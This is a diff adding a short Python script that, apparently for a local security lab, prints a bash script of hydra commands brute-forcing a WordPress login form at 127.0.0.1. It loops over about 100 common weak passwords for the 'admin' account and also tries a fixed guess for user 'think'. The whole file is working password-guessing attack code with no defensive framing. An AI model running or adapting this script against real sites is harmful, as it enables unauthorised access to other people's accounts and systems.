@@ -1,0 +1,6 @@
+myPassword = ["999","000","aaaaaa","abc123","alberto","alexandra","alexandro","amanda","andrea","angel","angels","anthony","asdf","asdfasdf","ashley","babygirl","baseball","basket","basketball","blahblah","bubbles","buster","butterfly","carlos","charlie","cheese","chocolate","computer","#1dad","diablo","dragon","elite","estrella","flower","football","forum","freedom","friends","hi","hello","hunter","iloveu","iloveyou","internet","jennifer","jessica","jesus","jordan","joshua","justin","killo","letmein","liverpool","lovely","loveme","loveyou","lovemama","#1mama","merlin","monkey","mustang","nicole","nothing","number1","pass","passport","password","password1","playboy","pokemon","pretty","princess","purple","pussy","qazwsx","qwerty","roberto","sebastian","secret","shadow","shit","soccer","starwars","sunshine","superman","tequiero","test","testing","trustno1","tweety","welcome","westside","whatever","windows","writer","zxcvbnm","zxczxc"]
+
+print("#!/bin/bash")
+for items in myPassword:
+    print("hydra -F -V -l think -p 123 127.0.0.1 http-post-form \"/cybersec/wp-login.php:log=think&pwd=^PASS^&wp-submit:ERROR\"")
+    print("hydra -F -V -l admin -p "+ items +" 127.0.0.1 http-post-form \"/cybersec/wp-login.php:log=admin&pwd=^PASS^&wp-submit:ERROR\"")
